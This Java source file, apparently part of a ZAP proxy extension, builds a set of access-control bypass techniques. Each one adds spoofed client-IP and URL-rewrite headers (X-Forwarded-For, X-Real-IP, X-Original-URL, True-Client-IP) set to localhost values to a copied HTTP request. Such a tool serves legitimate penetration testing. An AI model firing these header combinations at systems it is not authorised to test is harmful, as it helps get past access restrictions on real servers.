package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

public class IPComboTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "IP Combo"; }
    @Override public int getOrder() { return 49; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String[][] ipCombos = {
            {"X-Forwarded-For","127.0.0.1","X-Real-IP","127.0.0.1"},
            {"X-Forwarded-For","127.0.0.1","X-Real-Ip","localhost"},
            {"X-Forwarded-For","127.0.0.1","X-Original-URL",ctx.baseClean},
            {"X-Forwarded-For","127.0.0.1","X-Rewrite-URL",ctx.baseClean},
            {"X-Forwarded-For","127.0.0.1","X-Client-IP","127.0.0.1"},
            {"X-Forwarded-For","127.0.0.1","X-Remote-Addr","127.0.0.1"},
            {"X-Forwarded-For","127.0.0.1","True-Client-IP","127.0.0.1"},
            {"X-Forwarded-For","127.0.0.1","X-Forwarded-Host","localhost"},
            {"X-Real-IP","127.0.0.1","X-Client-IP","127.0.0.1"},
            {"X-Real-IP","127.0.0.1","X-Forwarded-Host","localhost"},
            {"X-Forwarded-For","::1","X-Real-IP","::1"},
            {"X-Forwarded-For","0.0.0.0","X-Real-IP","0.0.0.0"},
            {"X-Forwarded-For","127.0.0.1","X-Real-IP","127.0.0.1","X-Original-URL",ctx.baseClean},
            {"X-Forwarded-For","127.0.0.1","X-Real-IP","127.0.0.1","X-Rewrite-URL",ctx.baseClean}
        };
        for (String[] tr : ipCombos) {
            final String[] combo = tr.clone();
            StringBuilder label = new StringBuilder();
            for (int i = 0; i + 1 < combo.length; i += 2) {
                if (label.length() > 0) label.append(" + ");
                label.append(combo[i]).append("=").append(combo[i + 1]);
            }
            final String desc = label.toString();
            techs.add(new Technique("IP Combo", "XFFCombo:" + trunc(combo[1], 16),
                "Combined IP bypass: " + desc,
                base -> {
                    HttpMessage m = cloneMsg(base);
                    for (int i = 0; i + 1 < combo.length; i += 2) {
                        addHeader(m, combo[i], combo[i + 1]);
                    }
                    return m; }));
        }
    }
}
